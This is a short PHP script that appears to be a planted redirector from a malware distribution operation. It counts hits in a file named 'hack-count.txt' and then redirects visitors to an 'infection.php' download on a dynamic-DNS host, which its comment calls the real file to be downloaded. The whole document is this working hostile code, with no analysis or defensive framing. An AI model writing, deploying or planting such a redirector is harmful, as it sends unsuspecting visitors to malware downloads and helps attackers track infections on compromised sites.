<?php

$hack_count = @file_get_contents('hack-count.txt');
$hack_count++;
@file_put_contents('hack-count.txt', $hack_count);

header('Location: https://withersteen.zapto.org/webmaster/infection.php'); // redirect to the real file to be downloaded
